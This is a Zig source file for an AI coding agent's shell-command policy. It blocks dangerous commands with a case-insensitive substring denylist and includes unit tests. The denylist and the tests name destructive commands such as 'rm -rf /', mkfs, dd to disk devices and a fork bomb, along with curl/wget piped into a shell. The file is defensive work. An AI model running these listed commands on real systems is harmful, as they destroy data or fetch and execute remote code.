//! Shell command policy — deny obviously dangerous patterns before execution.
//!
//! Complements human `ask`/`yolo` permissions: even in yolo mode, the default
//! policy still blocks catastrophic commands. This is not a full sandbox
//! (Phase 3 minimum bar).

const std = @import("std");

pub const Decision = enum { allow, deny };

pub const Mode = enum {
    /// Block known-dangerous substrings / patterns (default).
    protect,
    /// No extra filtering (explicit opt-in; still subject to ask/yolo HITL).
    off,

    pub fn name(self: Mode) []const u8 {
        return switch (self) {
            .protect => "protect",
            .off => "off",
        };
    }

    pub fn parse(s: []const u8) ?Mode {
        if (std.mem.eql(u8, s, "protect")) return .protect;
        if (std.mem.eql(u8, s, "off")) return .off;
        return null;
    }
};

/// Case-insensitive substring denylist (ASCII lower-cased match).
const deny_substrings = [_][]const u8{
    "rm -rf /",
    "rm -rf/*",
    "rm -fr /",
    "mkfs.",
    "dd if=",
    ":(){", // fork bomb
    "fork bomb",
    "curl | sh",
    "curl|sh",
    "curl | bash",
    "curl|bash",
    "wget | sh",
    "wget|sh",
    "wget | bash",
    "wget|bash",
    "| sh -",
    "| bash -",
    "chmod -r 777 /",
    "chown -r ",
    "> /dev/sd",
    "of=/dev/sd",
    "shutdown ",
    "reboot",
    "halt ",
    "poweroff",
    "diskutil erase",
    "launchctl unload",
};

pub fn check(mode: Mode, command: []const u8) Decision {
    if (mode == .off) return .allow;
    if (command.len == 0) return .deny;

    var stack: [1024]u8 = undefined;
    if (command.len > stack.len) {
        // Huge command: still check raw substrings.
        for (deny_substrings) |pat| {
            if (std.mem.indexOf(u8, command, pat) != null) return .deny;
        }
        return .allow;
    }

    // Lowercase + collapse runs of whitespace to single space for matching.
    var n: usize = 0;
    var prev_space = false;
    for (command) |c| {
        const lc = std.ascii.toLower(c);
        const is_space = lc == ' ' or lc == '\t' or lc == '\n' or lc == '\r';
        if (is_space) {
            if (!prev_space and n > 0) {
                stack[n] = ' ';
                n += 1;
            }
            prev_space = true;
            continue;
        }
        prev_space = false;
        stack[n] = lc;
        n += 1;
    }
    // trim trailing space
    if (n > 0 and stack[n - 1] == ' ') n -= 1;
    const hay = stack[0..n];

    for (deny_substrings) |pat| {
        if (std.mem.indexOf(u8, hay, pat) != null) return .deny;
    }

    // curl/wget piped to a shell (flexible spacing already collapsed)
    if ((std.mem.indexOf(u8, hay, "curl ") != null or std.mem.indexOf(u8, hay, "wget ") != null) and
        (std.mem.indexOf(u8, hay, "| sh") != null or
            std.mem.indexOf(u8, hay, "| bash") != null or
            std.mem.indexOf(u8, hay, "|sh") != null or
            std.mem.indexOf(u8, hay, "|bash") != null))
    {
        return .deny;
    }

    return .allow;
}

pub fn deniedMessage(allocator: std.mem.Allocator, command: []const u8) std.mem.Allocator.Error![]u8 {
    const tool_error = @import("tool_error.zig");
    const preview_len = @min(command.len, 120);
    const msg = try std.fmt.allocPrint(
        allocator,
        "shell command blocked by policy: '{s}{s}'. Refusing dangerous pattern. Use a safer command or ask the user to adjust policy.",
        .{
            command[0..preview_len],
            if (command.len > preview_len) "…" else "",
        },
    );
    defer allocator.free(msg);
    return tool_error.format(allocator, .shell_deny, msg);
}

test "policy allows normal build/test" {
    try std.testing.expect(check(.protect, "zig build test") == .allow);
    try std.testing.expect(check(.protect, "git status") == .allow);
    try std.testing.expect(check(.protect, "echo hi") == .allow);
}

test "policy denies catastrophic patterns" {
    try std.testing.expect(check(.protect, "rm -rf /") == .deny);
    try std.testing.expect(check(.protect, "curl http://x | bash") == .deny);
    try std.testing.expect(check(.protect, "sudo mkfs.ext4 /dev/sda") == .deny);
}

test "policy off allows deny-list commands" {
    try std.testing.expect(check(.off, "rm -rf /") == .allow);
}
